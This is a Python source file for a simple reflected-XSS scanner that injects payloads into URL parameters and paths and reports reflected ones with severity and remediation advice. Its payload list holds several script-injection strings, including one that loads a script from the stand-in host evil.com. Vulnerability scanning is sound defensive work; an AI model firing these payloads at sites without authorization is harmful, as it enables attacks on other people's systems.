from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import requests
from utils.helpers import network_helper

class XSSScanner:
    def __init__(self):
        # Common XSS payloads for testing
        self.payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '"><svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<svg/onload=alert("XSS")>',
            '<math><mi//xlink:href="data:x,<script>alert(\'XSS\')</script>">',
            '"><script src=//evil.com/xss.js></script>'
        ]
        
        # Common parameter names to test
        self.common_params = [
            'q', 'query', 'search', 'id', 'page', 'file', 'redirect', 
            'url', 'link', 'goto', 'callback', 'return', 'next'
        ]
    
    def scan_url(self, url: str) -> List[Dict]:
        """Scan URL for XSS vulnerabilities"""
        vulnerabilities = []
        
        # Test reflected XSS in URL parameters
        reflected_vulns = self._test_reflected_xss(url)
        vulnerabilities.extend(reflected_vulns)
        
        # Test if URL itself is vulnerable
        direct_vulns = self._test_direct_xss(url)
        vulnerabilities.extend(direct_vulns)
        
        return vulnerabilities
    
    def _test_reflected_xss(self, base_url: str) -> List[Dict]:
        """Test for reflected XSS in URL parameters"""
        vulnerabilities = []
        
        try:
            # Parse URL to get parameters
            parsed = urlparse(base_url)
            params = parse_qs(parsed.query)
            
            # If no parameters, try common parameter names
            if not params:
                for param_name in self.common_params[:3]:  # Test first 3 common params
                    test_url = self._build_test_url(base_url, {param_name: self.payloads[0]})
                    if self._check_xss_reflection(test_url, self.payloads[0]):
                        vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'description': f'Potential reflected XSS in parameter "{param_name}"',
                            'severity': 'High',
                            'cvss_score': 7.5,
                            'remediation': 'Sanitize user input and properly escape output in HTML context'
                        })
                return vulnerabilities
            
            # Test existing parameters
            for param_name in params:
                original_value = params[param_name][0] if params[param_name] else ''
                
                # Test each payload
                for payload in self.payloads[:3]:  # Test first 3 payloads for efficiency
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = self._build_test_url(base_url, test_params)
                    
                    if self._check_xss_reflection(test_url, payload):
                        vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'description': f'Reflected XSS vulnerability in parameter "{param_name}"',
                            'severity': 'High',
                            'cvss_score': 7.5,
                            'remediation': f'Sanitize input for parameter "{param_name}" and properly escape HTML output'
                        })
                        break  # Found vulnerability, move to next parameter
                        
        except Exception as e:
            print(f"Error testing reflected XSS: {str(e)}")
        
        return vulnerabilities
    
    def _test_direct_xss(self, url: str) -> List[Dict]:
        """Test if URL itself is vulnerable to direct XSS"""
        vulnerabilities = []
        
        try:
            # Test URL path for XSS
            for payload in self.payloads[:2]:  # Test first 2 payloads
                # Try to inject payload in URL path
                test_url = url.rstrip('/') + '/' + payload
                if self._check_xss_reflection(test_url, payload):
                    vulnerabilities.append({
                        'type': 'Direct XSS',
                        'description': 'Potential XSS vulnerability in URL path handling',
                        'severity': 'High',
                        'cvss_score': 8.0,
                        'remediation': 'Properly validate and sanitize URL paths, implement proper routing'
                    })
                    break
                    
        except Exception as e:
            print(f"Error testing direct XSS: {str(e)}")
        
        return vulnerabilities
    
    def _build_test_url(self, base_url: str, params: dict) -> str:
        """Build URL with test parameters"""
        parsed = urlparse(base_url)
        query_string = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            query_string,
            parsed.fragment
        ))
    
    def _check_xss_reflection(self, test_url: str, payload: str) -> bool:
        """Check if payload is reflected in response"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            response = requests.get(test_url, headers=headers, timeout=10)
            
            # Check if payload appears in response
            response_text = response.text.lower()
            payload_lower = payload.lower()
            
            # Simple check for payload reflection
            if payload_lower in response_text:
                # Additional checks to reduce false positives
                # Check if it's in a context that could be executed
                dangerous_contexts = ['<script', 'onerror', 'onload', 'javascript:', '<svg', '<img']
                for context in dangerous_contexts:
                    if context in response_text:
                        return True
                        
                # Check for unescaped quotes around the payload
                if f'"{payload}"' in response.text or f"'{payload}'" in response.text:
                    return True
                    
            return False
            
        except Exception as e:
            print(f"Error checking XSS reflection: {str(e)}")
            return False

# Convenience function
def scan_xss(url: str) -> List[Dict]:
    """Simple function to scan for XSS vulnerabilities"""
    scanner = XSSScanner()
    return scanner.scan_url(url)